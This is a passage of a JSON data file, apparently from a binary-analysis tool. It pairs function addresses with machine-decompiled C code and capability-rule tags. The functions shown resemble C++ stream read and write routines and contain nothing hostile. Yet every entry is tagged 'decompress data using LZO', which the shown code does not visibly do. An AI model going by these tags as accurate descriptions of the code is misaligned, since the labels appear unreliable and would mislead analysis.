*(iStack180 + 0x78);\n        uStack144 = uStack80;\n        puStack148 = &stack0xffffff8c;\n        piStack160 = NULL;\n        uStack156 = 0xffffffff;\n        uStack164 = 0xffffffff;\n        puStack172 = 0x4865c6;\n        iStack152 = iStack180;\n        (**(**(iStack180 + 0x84) + 0x14))();\ncode_r0x004865c9:\n        if (uStack116 == 0) {\n            return extraout_ECX_06;\n        }\n        piStack168 = uStack116 | *(extraout_ECX_06 + *(*extraout_ECX_06 + -0xc) + 0x14);\n        puStack172 = 0x4865f2;\n        fcn.004bbce0();\n        return extraout_ECX_06;\n    }\n    puStack172 = 0x486606;\n    uVar11 = fcn.004bde60();\n    piStack168 = uVar11;\n    if (uVar11 >> 0x20 == 1) {\n        puStack172 = 0x486630;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_06 + -0xc);\n        puVar1 = extraout_ECX_06 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_06 + iVar9 + 0x10) & 1) == 0) {\n            puStack172 = 0x486644;\n            fcn.004c32d0();\n        }\n        puStack172 = 0x486649;\n        piVar5 = fcn.004c32d0();\n    }\n    else {\n        puStack172 = 0x486613;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_06 + -0xc);\n        puVar1 = extraout_ECX_06 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_06 + iVar9 + 0x10) & 1) == 0) {\n            puStack172 = 0x486629;\n            fcn.004c2fb0();\n            goto code_r0x004865c9;\n        }\n        puStack172 = 0x486652;\n        fcn.004c32d0();\n        piVar5 = extraout_ECX_06;\n    }\n    puStack172 = 0x486657;\n    fcn.004c2fb0();\n    puStack172 = 0x48665f;\n    piStack168 = piVar5;\n    uStack184 = fcn.0043a8e0();\n    puStack172 = 0x486666;\n    fcn.004c2fb0();\n    puStack172 = 0x48666e;\n    piStack168 = uStack184;\n    fcn.0043a8e0();\n    uStack240 = 0;\n    uStack248 = 0x48668e;\n    piStack244 = extraout_ECX;\n    iStack176 = unaff_EDI;\n    puStack172 = &stack0xffffffa8;\n    fcn.00487fd0();\n    if (cStack201 == '\\0') {\n        return extraout_ECX;\n    }\n    uStack200 = 0;\n    iStack264 = *(*extraout_ECX + -0xc) + extraout_ECX;\n    if (*(iStack264 + 0x84) != NULL) {\n        piStack252 = *(iStack264 + 0x78);\n        uStack228 = uStack164;\n        puStack232 = &stack0xffffff38;\n        piStack244 = NULL;\n        uStack240 = 0xffffffff;\n        uStack248 = 0xffffffff;\n        puStack256 = 0x4866e6;\n        iStack236 = iStack264;\n        (**(**(iStack264 + 0x84) + 0xc))();\ncode_r0x004866e9:\n        if (uStack200 == 0) {\n            return extraout_ECX;\n        }\n        piStack252 = uStack200 | *(extraout_ECX + *(*extraout_ECX + -0xc) + 0x14);\n        puStack256 = 0x486712;\n        fcn.004bbce0();\n        return extraout_ECX;\n    }\n    puStack256 = 0x486726;\n    uVar11 = fcn.004bde60();\n    piStack252 = uVar11;\n    if (uVar11 >> 0x20 == 1) {\n        puStack256 = 0x486750;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar9 + 0x10) & 1) == 0) {\n            puStack256 = 0x486764;\n            fcn.004c32d0();\n        }\n        puStack256 = 0x486769;\n        piVar5 = fcn.004c32d0();\n    }\n    else {\n        puStack256 = 0x486733;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar9 + 0x10) & 1) == 0) {\n            puStack256 = 0x486749;\n            fcn.004c2fb0();\n            goto code_r0x004866e9;\n        }\n        puStack256 = 0x486772;\n        fcn.004c32d0();\n        piVar5 = extraout_ECX;\n    }\n    puStack256 = 0x486777;\n    fcn.004c2fb0();\n    puStack256 = 0x48677f;\n    piStack252 = piVar5;\n    uStack268 = fcn.0043a8e0();\n    puStack256 = 0x486786;\n    fcn.004c2fb0();\n    puStack256 = 0x48678e;\n    piStack252 = uStack268;\n    fcn.0043a8e0();\n    uStack324 = 0;\n    uStack332 = 0x4867ae;\n    piStack328 = extraout_ECX_00;\n    iStack260 = unaff_EDI;\n    puStack256 = &stack0xffffff54;\n    fcn.00487fd0();\n    if (cStack285 == '\\0') {\n        return extraout_ECX_00;\n    }\n    uStack284 = 0;\n    iStack348 = *(*extraout_ECX_00 + -0xc) + extraout_ECX_00;\n    if (*(iStack348 + 0x84) != NULL) {\n        piStack336 = *(iStack348 + 0x78);\n        uStack312 = uStack248;\n        puStack316 = &stack0xfffffee4;\n        piStack328 = NULL;\n        uStack324 = 0xffffffff;\n        uStack332 = 0xffffffff;\n        puStack340 = 0x486806;\n        iStack320 = iStack348;\n        (**(**(iStack348 + 0x84) + 0x18))();\ncode_r0x00486809:\n        if (uStack284 == 0) {\n            return extraout_ECX_00;\n        }\n        piStack336 = uStack284 | *(extraout_ECX_00 + *(*extraout_ECX_00 + -0xc) + 0x14);\n        puStack340 = 0x486832;\n        fcn.004bbce0();\n        return extraout_ECX_00;\n    }\n    puStack340 = 0x486846;\n    uVar11 = fcn.004bde60();\n    piStack336 = uVar11;\n    if (uVar11 >> 0x20 == 1) {\n        puStack340 = 0x486870;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar9 + 0x10) & 1) == 0) {\n            puStack340 = 0x486884;\n            fcn.004c32d0();\n        }\n        puStack340 = 0x486889;\n        piVar5 = fcn.004c32d0();\n    }\n    else {\n        puStack340 = 0x486853;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar9 + 0x10) & 1) == 0) {\n            puStack340 = 0x486869;\n            fcn.004c2fb0();\n            goto code_r0x00486809;\n        }\n        puStack340 = 0x486892;\n        fcn.004c32d0();\n        piVar5 = extraout_ECX_00;\n    }\n    puStack340 = 0x486897;\n    fcn.004c2fb0();\n    puStack340 = 0x48689f;\n    piStack336 = piVar5;\n    uStack352 = fcn.0043a8e0();\n    puStack340 = 0x4868a6;\n    fcn.004c2fb0();\n    puStack340 = 0x4868ae;\n    piStack336 = uStack352;\n    fcn.0043a8e0();\n    uStack408 = 0;\n    uStack416 = 0x4868ce;\n    piStack412 = extraout_ECX_01;\n    iStack344 = unaff_EDI;\n    puStack340 = &stack0xffffff00;\n    fcn.00487fd0();\n    if (cStack369 == '\\0') {\n        return extraout_ECX_01;\n    }\n    uStack368 = 0;\n    iStack432 = *(*extraout_ECX_01 + -0xc) + extraout_ECX_01;\n    if (*(iStack432 + 0x84) != NULL) {\n        piStack420 = *(iStack432 + 0x78);\n        uStack396 = uStack332;\n        puStack400 = &stack0xfffffe90;\n        piStack412 = NULL;\n        uStack408 = 0xffffffff;\n        uStack416 = 0xffffffff;\n        puStack424 = 0x486926;\n        iStack404 = iStack432;\n        (**(**(iStack432 + 0x84) + 0x10))();\ncode_r0x00486929:\n        if (uStack368 == 0) {\n            return extraout_ECX_01;\n        }\n        piStack420 = uStack368 | *(extraout_ECX_01 + *(*extraout_ECX_01 + -0xc) + 0x14);\n        puStack424 = 0x486952;\n        fcn.004bbce0();\n        return extraout_ECX_01;\n    }\n    puStack424 = 0x486966;\n    uVar11 = fcn.004bde60();\n    piStack420 = uVar11;\n    if (uVar11 >> 0x20 == 1) {\n        puStack424 = 0x486990;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_01 + -0xc);\n        puVar1 = extraout_ECX_01 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_01 + iVar9 + 0x10) & 1) == 0) {\n            puStack424 = 0x4869a4;\n            fcn.004c32d0();\n        }\n        puStack424 = 0x4869a9;\n        piVar5 = fcn.004c32d0();\n    }\n    else {\n        puStack424 = 0x486973;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_01 + -0xc);\n        puVar1 = extraout_ECX_01 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_01 + iVar9 + 0x10) & 1) == 0) {\n            puStack424 = 0x486989;\n            fcn.004c2fb0();\n            goto code_r0x00486929;\n        }\n        puStack424 = 0x4869b2;\n        fcn.004c32d0();\n        piVar5 = extraout_ECX_01;\n    }\n    puStack424 = 0x4869b7;\n    fcn.004c2fb0();\n    puStack424 = 0x4869bf;\n    piStack420 = piVar5;\n    uStack436 = fcn.0043a8e0();\n    puStack424 = 0x4869c6;\n    fcn.004c2fb0();\n    puStack424 = 0x4869ce;\n    piStack420 = uStack436;\n    fcn.0043a8e0();\n    uStack492 = 0;\n    uStack500 = 0x4869ee;\n    piStack496 = extraout_ECX_02;\n    iStack428 = unaff_EDI;\n    puStack424 = &stack0xfffffeac;\n    fcn.00487fd0();\n    if (cStack453 == '\\0') {\n        return extraout_ECX_02;\n    }\n    uStack452 = 0;\n    iStack516 = *(*extraout_ECX_02 + -0xc) + extraout_ECX_02;\n    if (*(iStack516 + 0x84) != NULL) {\n        piStack504 = *(iStack516 + 0x78);\n        uStack480 = uStack416;\n        puStack484 = &stack0xfffffe3c;\n        piStack496 = NULL;\n        uStack492 = 0xffffffff;\n        uStack500 = 0xffffffff;\n        puStack508 = 0x486a46;\n        iStack488 = iStack516;\n        (**(**(iStack516 + 0x84) + 0x1c))();\ncode_r0x00486a49:\n        if (uStack452 == 0) {\n            return extraout_ECX_02;\n        }\n        piStack504 = uStack452 | *(extraout_ECX_02 + *(*extraout_ECX_02 + -0xc) + 0x14);\n        puStack508 = 0x486a72;\n        fcn.004bbce0();\n        return extraout_ECX_02;\n    }\n    puStack508 = 0x486a86;\n    uVar11 = fcn.004bde60();\n    piStack504 = uVar11;\n    if (uVar11 >> 0x20 == 1) {\n        puStack508 = 0x486ab0;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_02 + -0xc);\n        puVar1 = extraout_ECX_02 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_02 + iVar9 + 0x10) & 1) == 0) {\n            puStack508 = 0x486ac4;\n            fcn.004c32d0();\n        }\n        puStack508 = 0x486ac9;\n        piVar5 = fcn.004c32d0();\n    }\n    else {\n        puStack508 = 0x486a93;\n        fcn.004c2e40();\n        iVar9 = *(*extraout_ECX_02 + -0xc);\n        puVar1 = extraout_ECX_02 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_02 + iVar9 + 0x10) & 1) == 0) {\n            puStack508 = 0x486aa9;\n            fcn.004c2fb0();\n            goto code_r0x00486a49;\n        }\n        puStack508 = 0x486ad2;\n        fcn.004c32d0();\n        piVar5 = extraout_ECX_02;\n    }\n    puStack508 = 0x486ad7;\n    fcn.004c2fb0();\n    puStack508 = 0x486adf;\n    piStack504 = piVar5;\n    uStack520 = fcn.0043a8e0();\n    puStack508 = 0x486ae6;\n    fcn.004c2fb0();\n    puStack508 = 0x486aee;\n    piStack504 = uStack520;\n    fcn.0043a8e0();\n    uVar12 = 0x486b0e;\n    piVar5 = extraout_ECX_03;\n    iStack512 = unaff_EDI;\n    puStack508 = &stack0xfffffe58;\n    fcn.00487fd0(extraout_ECX_03, 0);\n    if (cStack537 == '\\0') {\n        return extraout_ECX_03;\n    }\n    uStack536 = 0;\n    iVar9 = *(*extraout_ECX_03 + -0xc) + extraout_ECX_03;\n    if (*(iVar9 + 0x84) != NULL) {\n        (**(**(iVar9 + 0x84) + 0x20))(*(iVar9 + 0x78), 0xffffffff, 0, 0xffffffff, iVar9, &stack0xfffffde8, uStack500);\ncode_r0x00486b69:\n        if (uStack536 == 0) {\n            return extraout_ECX_03;\n        }\n        fcn.004bbce0(uStack536 | *(extraout_ECX_03 + *(*extraout_ECX_03 + -0xc) + 0x14));\n        return extraout_ECX_03;\n    }\n    uVar11 = fcn.004bde60();\n    if (uVar11 >> 0x20 == 1) {\n        fcn.004c2e40(uVar11);\n        iVar9 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        piVar3 = fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40(uVar11);\n        iVar9 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar9 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar9 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            goto code_r0x00486b69;\n        }\n        fcn.004c32d0();\n        piVar3 = extraout_ECX_03;\n    }\n    fcn.004c2fb0();\n    uVar4 = fcn.0043a8e0(piVar3);\n    fcn.004c2fb0();\n    fcn.0043a8e0(uVar4);\n    piVar3 = *(extraout_ECX_04 + *(*extraout_ECX_04 + -0xc) + 0x7c);\n    if (piVar3 != NULL) {\n        if (*(piVar3 + 7) == '\\0') {\n            fcn.004512b0();\n            iVar9 = 10;\n            if (*(*piVar3 + 0x18) != 0x451560) {\n                cVar2 = (**(*piVar3 + 0x18))(10);\n                iVar9 = cVar2;\n            }\n        }\n        else {\n            iVar9 = *(piVar3 + 0x27);\n        }\n        piVar5 = fcn.00486c90(uVar12, piVar5, iVar9);\n        return piVar5;\n    }\n    fcn.004bde60();\n    extraout_ECX_05[1] = 0;\n    fcn.00487fd0(extraout_ECX_05, 1);\n    if (cStack653 == '\\0') {\n        if (0 < in_stack_fffffd98) {\n            *in_stack_fffffd9c = 0;\n            iVar9 = extraout_ECX_05[1];\n            goto joined_r0x00486d50;\n        }\n        iVar9 = extraout_ECX_05[1];\ncode_r0x00486df6:\n        if (iVar9 != 0) {\n            return extraout_ECX_05;\n        }\n    }\n    else {\n        piVar5 = *(extraout_ECX_05 + *(*extraout_ECX_05 + -0xc) + 0x78);\n        puVar7 = piVar5[2];\n        if (puVar7 <= piVar5[3] && piVar5[3] != puVar7) goto code_r0x00486d5e;\ncode_r0x00486d20:\n        uVar6 = (**(*piVar5 + 0x24))();\n        iVar9 = extraout_ECX_05[1];\n        puVar10 = in_stack_fffffd9c;\n        if (iVar9 + 1 < in_stack_fffffd98) {\n            do {\n                in_stack_fffffd9c = puVar10;\n                if (uVar6 == 0xffffffff) {\ncode_r0x00486d9e:\n                    uVar6 = 2;\n                    puVar10 = in_stack_fffffd9c;\ncode_r0x00486da3:\n                    if (0 < in_stack_fffffd98) {\n                        *puVar10 = 0;\n                    }\n                    if (extraout_ECX_05[1] == 0) {\n                        uVar6 = uVar6 | 4;\n                    }\n                    else if (uVar6 == 0) {\n                        return extraout_ECX_05;\n                    }\n                    goto code_r0x00486ce1;\n                }\n                if ((uStack604 & 0xff) == uVar6) {\n                    uVar6 = 0;\n                    goto code_r0x00486da3;\n                }\n                in_stack_fffffd9c = puVar10 + 1;\n                *puVar10 = uVar6;\n                puVar7 = piVar5[2];\n                puVar8 = piVar5[3];\n                extraout_ECX_05[1] = extraout_ECX_05[1] + 1;\n                if (puVar7 < puVar8) {\n                    puVar7 = puVar7 + 1;\n                    piVar5[2] = puVar7;\n                }\n                else {\n                    iVar9 = (**(*piVar5 + 0x28))();\n                    if (iVar9 == -1) goto code_r0x00486d9e;\n                    puVar7 = piVar5[2];\n                    puVar8 = piVar5[3];\n                }\n                if (puVar8 <= puVar7) goto code_r0x00486d20;\ncode_r0x00486d5e:\n                iVar9 = extraout_ECX_05[1];\n                uVar6 = *puVar7;\n                puVar10 = in_stack_fffffd9c;\n                if (in_stack_fffffd98 <= iVar9 + 1) break;\n            } while( true );\n        }\n        if (uVar6 == 0xffffffff) {\n            if (0 < in_stack_fffffd98) {\n                *in_stack_fffffd9c = 0;\n                iVar9 = extraout_ECX_05[1];\n            }\n            if (iVar9 == 0) {\n                uVar6 = 6;\n            }\n            else {\n                uVar6 = 2;\n            }\n            goto code_r0x00486ce1;\n        }\n        if (in_stack_fffffd98 < 1) goto code_r0x00486df6;\n        *in_stack_fffffd9c = 0;\n        iVar9 = extraout_ECX_05[1];\njoined_r0x00486d50:\n        if (iVar9 != 0) {\n            return extraout_ECX_05;\n        }\n    }\n    uVar6 = 4;\ncode_r0x00486ce1:\n    fcn.004bbce0(uVar6 | *(extraout_ECX_05 + *(*extraout_ECX_05 + -0xc) + 0x14));\n    return extraout_ECX_05;\n}\n",
        "token_count": 7483
    },
    "004890c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00486a60)\n// WARNING: Removing unreachable block (ram,0x00486940)\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.004890c0(ushort *arg_8h)\n\n{\n    uint32_t *puVar1;\n    bool bVar2;\n    char cVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    int32_t *piVar6;\n    uint32_t uVar7;\n    uint8_t *puVar8;\n    int32_t *extraout_ECX;\n    int32_t *extraout_ECX_00;\n    int32_t *extraout_ECX_01;\n    int32_t *extraout_ECX_02;\n    int32_t *in_ECX;\n    int32_t *extraout_ECX_03;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    uint8_t *puVar9;\n    int32_t extraout_EDX_01;\n    int32_t iVar10;\n    uchar *puVar11;\n    ulong uVar12;\n    char cStack401;\n    int32_t in_stack_fffffe94;\n    uchar *in_stack_fffffe98;\n    uint32_t uStack352;\n    uint uVar13;\n    char cStack285;\n    uint32_t auStack284 [4];\n    uint uStack268;\n    int32_t iStack264;\n    char cStack201;\n    char cStack117;\n    uint var_21h;\n    int32_t var_1ch;\n    uint var_ch;\n    \n    fcn.00487fd0();\n    if (var_21h == '\\0') {\n        return in_ECX;\n    }\n    bVar2 = false;\n    piVar6 = *(in_ECX + *(*in_ECX + -0xc) + 0x84);\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 0xc))();\n        if (var_1ch < -0x8000) {\n            bVar2 = true;\n            *arg_8h = 0x8000;\n        }\n        else {\n            if (0x7fff < var_1ch) {\n                *arg_8h = 0x7fff;\n                goto code_r0x0048918d;\n            }\n            *arg_8h = var_1ch;\n        }\ncode_r0x0048915c:\n        if (!bVar2) {\n            return in_ECX;\n        }\ncode_r0x0048918d:\n        fcn.004bbce0();\n        return in_ECX;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_01 == 1) {\n        fcn.004c2e40();\n        iVar10 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar10 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar10 = *(*in_ECX + -0xc);\n        puVar1 = in_ECX + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(in_ECX + iVar10 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            goto code_r0x0048915c;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.00487fd0();\n    if (cStack117 == '\\0') {\n        return extraout_ECX_03;\n    }\n    piVar6 = *(extraout_ECX_03 + *(*extraout_ECX_03 + -0xc) + 0x84);\n    if (piVar6 != NULL) {\n        (**(*piVar6 + 0x10))();\n        return extraout_ECX_03;\n    }\n    fcn.004bde60();\n    if (extraout_EDX == 1) {\n        fcn.004c2e40();\n        iVar10 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar10 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar10 = *(*extraout_ECX_03 + -0xc);\n        puVar1 = extraout_ECX_03 + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_03 + iVar10 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX_03;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    fcn.00487fd0();\n    if (cStack201 == '\\0') {\n        return extraout_ECX;\n    }\n    iStack264 = *(*extraout_ECX + -0xc) + extraout_ECX;\n    if (*(iStack264 + 0x84) != NULL) {\n        (**(**(iStack264 + 0x84) + 0x1c))();\n        return extraout_ECX;\n    }\n    fcn.004bde60();\n    if (extraout_EDX_00 == 1) {\n        fcn.004c2e40();\n        iVar10 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar10 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40();\n        iVar10 = *(*extraout_ECX + -0xc);\n        puVar1 = extraout_ECX + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX + iVar10 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            return extraout_ECX;\n        }\n        fcn.004c32d0();\n    }\n    fcn.004c2fb0();\n    uStack268 = fcn.0043a8e0();\n    fcn.004c2fb0();\n    fcn.0043a8e0();\n    uVar13 = 0x486b0e;\n    piVar6 = extraout_ECX_00;\n    fcn.00487fd0(extraout_ECX_00, 0);\n    if (cStack285 == '\\0') {\n        return extraout_ECX_00;\n    }\n    auStack284[0] = 0;\n    iVar10 = *(*extraout_ECX_00 + -0xc) + extraout_ECX_00;\n    if (*(iVar10 + 0x84) != NULL) {\n        (**(**(iVar10 + 0x84) + 0x20))(*(iVar10 + 0x78), 0xffffffff, 0, 0xffffffff, iVar10, auStack284, 0x4869ee);\ncode_r0x00486b69:\n        if (auStack284[0] == 0) {\n            return extraout_ECX_00;\n        }\n        fcn.004bbce0(auStack284[0] | *(extraout_ECX_00 + *(*extraout_ECX_00 + -0xc) + 0x14));\n        return extraout_ECX_00;\n    }\n    uVar12 = fcn.004bde60();\n    if (uVar12 >> 0x20 == 1) {\n        fcn.004c2e40(uVar12);\n        iVar10 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar10 + 0x10) & 1) == 0) {\n            fcn.004c32d0();\n        }\n        piVar4 = fcn.004c32d0();\n    }\n    else {\n        fcn.004c2e40(uVar12);\n        iVar10 = *(*extraout_ECX_00 + -0xc);\n        puVar1 = extraout_ECX_00 + iVar10 + 0x14;\n        *puVar1 = *puVar1 | 1;\n        if ((*(extraout_ECX_00 + iVar10 + 0x10) & 1) == 0) {\n            fcn.004c2fb0();\n            goto code_r0x00486b69;\n        }\n        fcn.004c32d0();\n        piVar4 = extraout_ECX_00;\n    }\n    fcn.004c2fb0();\n    uVar5 = fcn.0043a8e0(piVar4);\n    fcn.004c2fb0();\n    fcn.0043a8e0(uVar5);\n    piVar4 = *(extraout_ECX_01 + *(*extraout_ECX_01 + -0xc) + 0x7c);\n    if (piVar4 != NULL) {\n        if (*(piVar4 + 7) == '\\0') {\n            fcn.004512b0();\n            iVar10 = 10;\n            if (*(*piVar4 + 0x18) != 0x451560) {\n                cVar3 = (**(*piVar4 + 0x18))(10);\n                iVar10 = cVar3;\n            }\n        }\n        else {\n            iVar10 = *(piVar4 + 0x27);\n        }\n        piVar6 = fcn.00486c90(uVar13, piVar6, iVar10);\n        return piVar6;\n    }\n    fcn.004bde60();\n    extraout_ECX_02[1] = 0;\n    fcn.00487fd0(extraout_ECX_02, 1);\n    if (cStack401 == '\\0') {\n        if (0 < in_stack_fffffe94) {\n            *in_stack_fffffe98 = 0;\n            iVar10 = extraout_ECX_02[1];\n            goto joined_r0x00486d50;\n        }\n        iVar10 = extraout_ECX_02[1];\ncode_r0x00486df6:\n        if (iVar10 != 0) {\n            return extraout_ECX_02;\n        }\n    }\n    else {\n        piVar6 = *(extraout_ECX_02 + *(*extraout_ECX_02 + -0xc) + 0x78);\n        puVar8 = piVar6[2];\n        if (puVar8 <= piVar6[3] && piVar6[3] != puVar8) goto code_r0x00486d5e;\ncode_r0x00486d20:\n        uVar7 = (**(*piVar6 + 0x24))();\n        iVar10 = extraout_ECX_02[1];\n        puVar11 = in_stack_fffffe98;\n        if (iVar10 + 1 < in_stack_fffffe94) {\n            do {\n                in_stack_fffffe98 = puVar11;\n                if (uVar7 == 0xffffffff) {\ncode_r0x00486d9e:\n                    uVar7 = 2;\n                    puVar11 = in_stack_fffffe98;\ncode_r0x00486da3:\n                    if (0 < in_stack_fffffe94) {\n                        *puVar11 = 0;\n                    }\n                    if (extraout_ECX_02[1] == 0) {\n                        uVar7 = uVar7 | 4;\n                    }\n                    else if (uVar7 == 0) {\n                        return extraout_ECX_02;\n                    }\n                    goto code_r0x00486ce1;\n                }\n                if ((uStack352 & 0xff) == uVar7) {\n                    uVar7 = 0;\n                    goto code_r0x00486da3;\n                }\n                in_stack_fffffe98 = puVar11 + 1;\n                *puVar11 = uVar7;\n                puVar8 = piVar6[2];\n                puVar9 = piVar6[3];\n                extraout_ECX_02[1] = extraout_ECX_02[1] + 1;\n                if (puVar8 < puVar9) {\n                    puVar8 = puVar8 + 1;\n                    piVar6[2] = puVar8;\n                }\n                else {\n                    iVar10 = (**(*piVar6 + 0x28))();\n                    if (iVar10 == -1) goto code_r0x00486d9e;\n                    puVar8 = piVar6[2];\n                    puVar9 = piVar6[3];\n                }\n                if (puVar9 <= puVar8) goto code_r0x00486d20;\ncode_r0x00486d5e:\n                iVar10 = extraout_ECX_02[1];\n                uVar7 = *puVar8;\n                puVar11 = in_stack_fffffe98;\n                if (in_stack_fffffe94 <= iVar10 + 1) break;\n            } while( true );\n        }\n        if (uVar7 == 0xffffffff) {\n            if (0 < in_stack_fffffe94) {\n                *in_stack_fffffe98 = 0;\n                iVar10 = extraout_ECX_02[1];\n            }\n            if (iVar10 == 0) {\n                uVar7 = 6;\n            }\n            else {\n                uVar7 = 2;\n            }\n            goto code_r0x00486ce1;\n        }\n        if (in_stack_fffffe94 < 1) goto code_r0x00486df6;\n        *in_stack_fffffe98 = 0;\n        iVar10 = extraout_ECX_02[1];\njoined_r0x00486d50:\n        if (iVar10 != 0) {\n            return extraout_ECX_02;\n        }\n    }\n    uVar7 = 4;\ncode_r0x00486ce1:\n    fcn.004bbce0(uVar7 | *(extraout_ECX_02 + *(*extraout_ECX_02 + -0xc) + 0x14));\n    return extraout_ECX_02;\n}\n",
        "token_count": 3444
    },
    "00489260": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00489260(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint var_10h;\n    int32_t *var_ch;\n    uint var_8h;\n    \n    fcn.004898e0();\n    if (var_10h != '\\0') {\n        piVar1 = *(in_ECX + *(*in_ECX + -0xc) + 0x78);\n        if (piVar1[5] < piVar1[6]) {\n            *piVar1[5] = arg_8h;\n            piVar1[5] = piVar1[5] + 1;\n        }\n        else {\n            iVar3 = (**(*piVar1 + 0x34))(arg_8h);\n            if (iVar3 == -1) {\n                fcn.004bbce0();\n            }\n        }\n    }\n    iVar3 = *(*var_ch + -0xc);\n    if ((*(var_ch + iVar3 + 0xd) & 0x20) != 0) {\n        cVar2 = fcn.004bdfd0();\n        if ((cVar2 == '\\0') && (piVar1 = *(var_ch + iVar3 + 0x78),  piVar1 != NULL)) {\n            iVar3 = (**(*piVar1 + 0x18))();\n            if (iVar3 == -1) {\n                fcn.004bbce0(*(var_ch + *(*var_ch + -0xc) + 0x14) | 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 394
    },
    "00489400": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00489400(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = *(param_1 + *(*param_1 + -0xc) + 0x78);\n    if (piVar1 != NULL) {\n        iVar2 = (**(*piVar1 + 0x18))();\n        if (iVar2 == -1) {\n            fcn.004bbce0(*(param_1 + *(*param_1 + -0xc) + 0x14) | 1);\n            return param_1;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 149
    },
    "004894b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
